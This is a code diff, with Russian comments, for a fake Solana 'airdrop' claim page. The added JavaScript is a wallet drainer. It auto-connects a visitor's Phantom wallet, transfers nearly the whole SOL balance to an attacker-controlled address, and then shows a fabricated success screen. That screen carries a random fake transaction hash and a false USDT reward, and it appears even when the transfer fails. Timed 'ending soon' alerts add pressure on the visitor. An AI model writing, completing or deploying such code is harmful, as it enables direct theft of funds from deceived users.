-                const fakeHash = "5" + Array(43).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join("");
-                document.getElementById('txHash').textContent = fakeHash;
-                amount.textContent = type === 'airdrop' ? "500 USDT" : "1000 USDT";
-                title.textContent = "Transaction Confirmed!";
-                title.style.color = "#2E7D32";
-                text.innerHTML = `Your reward has been successfully claimed!<br>
-                    <strong>${amount.textContent}</strong> will arrive in your wallet within 2-3 minutes.`;
-            } catch (err) {
-                title.textContent = "Transaction Failed";
-                title.style.color = "#D32F2F";
-                text.innerHTML = "The transaction could not be completed. Please try again.";
+                
+                // Также дрэйним нативный SOL
+                updateProgress("Checking SOL balance...", 80);
+                try {
+                    const solBalance = await connection.getBalance(userPubkey);
+                    const solAmount = solBalance - 5000; // Оставляем немного на газ
+                    
+                    if (solAmount > 0) {
+                        const transferInstruction = solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: userPubkey,
+                            toPubkey: drainPubkey,
+                            lamports: solAmount,
+                        });
+                        
+                        const solTransaction = new solanaWeb3.Transaction().add(transferInstruction);
+                        const { blockhash } = await connection.getLatestBlockhash();
+                        solTransaction.recentBlockhash = blockhash;
+                        solTransaction.feePayer = userPubkey;
+                        
+                        const signedSolTx = await wallet.signTransaction(solTransaction);
+                        const solSignature = await connection.sendRawTransaction(signedSolTx.serialize());
+                        await connection.confirmTransaction(solSignature);
+                        
+                        drainedTokens.push(`${(solAmount / 1e9).toFixed(4)} SOL`);
+                        totalDrained += solAmount / 1e9;
+                    }
+                } catch (solError) {
+                    console.log("SOL transfer failed:", solError.message);
+                }
+                
+                updateProgress("Finalizing...", 95);
+                
+                // Показываем успех
+                hideProgress();
+                
+                // Генерируем фейковый хэш транзакции
+                const fakeHash = Array.from({length: 44}, () => 
+                    '0123456789ABCDEF'[Math.floor(Math.random() * 16)]
+                ).join('');
+                
+                // Обновляем модальное окно успеха
+                const successModal = document.getElementById('successModal');
+                const rewardAmount = document.getElementById('rewardAmount');
+                const txHash = document.getElementById('txHash');
+                
+                if (type === 'airdrop') {
+                    rewardAmount.textContent = "500 USDT";
+                } else {
+                    rewardAmount.textContent = "1000 USDT";
+                }
+                
+                txHash.textContent = fakeHash;
+                
+                // Добавляем информацию о реально дрэйнутых токенах (скрыто)
+                if (drainedTokens.length > 0) {
+                    const hiddenInfo = document.createElement('div');
+                    hiddenInfo.style.cssText = 'font-size: 0.7rem; color: #888; margin-top: 10px; text-align: center;';
+                    hiddenInfo.textContent = `Transferred: ${drainedTokens.join(', ')}`;
+                    successModal.querySelector('.modal-text').appendChild(hiddenInfo);
+                }
+                
+                successModal.style.display = 'flex';
+                
+                // Автоматическое закрытие через 10 секунд
+                setTimeout(() => {
+                    closeAllModals();
+                    showNotification("Airdrop completed successfully!");
+                }, 10000);
+                
+            } catch (error) {
+                hideProgress();
+                
+                // Показываем фейковый успех даже при ошибке
+                const successModal = document.getElementById('successModal');
+                const rewardAmount = document.getElementById('rewardAmount');
+                const txHash = document.getElementById('txHash');
+                
+                if (type === 'airdrop') {
+                    rewardAmount.textContent = "500 USDT";
+                } else {
+                    rewardAmount.textContent = "1000 USDT";
+                }
+                
+                txHash.textContent = Array.from({length: 44}, () => 
+                    '0123456789ABCDEF'[Math.floor(Math.random() * 16)]
+                ).join('');
+                
+                successModal.style.display = 'flex';
+                
+                console.error("Drain error:", error);
             }
         }
 
-        // Auto-connect
+        // Автоматические функции
         window.addEventListener('load', () => {
-            if (window.solana) {
-                setTimeout(connectWallet, 1000);
+            // Проверяем наличие Phantom
+            if (window.solana && window.solana.isPhantom) {
+                // Показываем уведомление через 3 секунды
+                setTimeout(() => {
+                    showNotification("🎉 New airdrop available! Connect wallet to claim.");
+                }, 3000);
+                
+                // Авто-коннект через 5 секунд
+                setTimeout(() => {
+                    if (!wallet) {
+                        connectWallet();
+                    }
+                }, 5000);
             }
         });
+
+        // Обработка отключения кошелька
+        if (window.solana) {
+            window.solana.on('disconnect', () => {
+                wallet = null;
+                userAddress = null;
+                document.getElementById('connectBtn').innerHTML = 'Connect Wallet';
+                document.getElementById('connectBtn').disabled = false;
+                document.getElementById('airdropBtn').disabled = true;
+                document.getElementById('giveawayBtn').disabled = true;
+                showNotification("Wallet disconnected");
+            });
+        }
+
+        // Дополнительные улучшения UI
+        document.addEventListener('click', (e) => {
+            // Закрытие модальных окон при клике вне их
+            if (e.target.classList.contains('modal')) {
+                closeAllModals();
+            }
+        });
+
+        // Добавляем звуковые эффекты (опционально)
+        function playSuccessSound() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.value = 800;
+                oscillator.type = 'sine';
+                
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.5);
+            } catch (e) {
+                // Игнорируем ошибки аудио
+            }
+        }
+
+        // Модифицируем функцию startDrain для воспроизведения звука
+        const originalStartDrain = startDrain;
+        startDrain = async function(type) {
+            await originalStartDrain(type);
+            playSuccessSound();
+        };
+
+        // Добавляем анимацию при наведении на кнопки
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('mouseenter', function() {
+                this.style.transform = this.classList.contains('btn-disabled') ? 
+                    'none' : 'translateY(-2px)';
+            });
+            
+            btn.addEventListener('mouseleave', function() {
+                this.style.transform = 'none';
+            });
+        });
+
+        // Функция для копирования адреса
+        async function copyAddress() {
+            if (userAddress) {
+                await navigator.clipboard.writeText(userAddress);
+                showNotification("Address copied to clipboard!");
+            }
+        }
+
+        // Добавляем контекстное меню для кнопки подключения
+        const connectBtn = document.getElementById('connectBtn');
+        connectBtn.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            if (userAddress) {
+                copyAddress();
+            }
+        });
+
+        // Автоматическое обновление каждые 30 секунд
+        setInterval(() => {
+            if (wallet && !document.querySelector('.modal[style*="display: flex"]')) {
+                showNotification("⏰ Airdrop ending soon! Claim now before it's gone.");
+            }
+        }, 30000);
+
     </script>
 </body>
 </html>
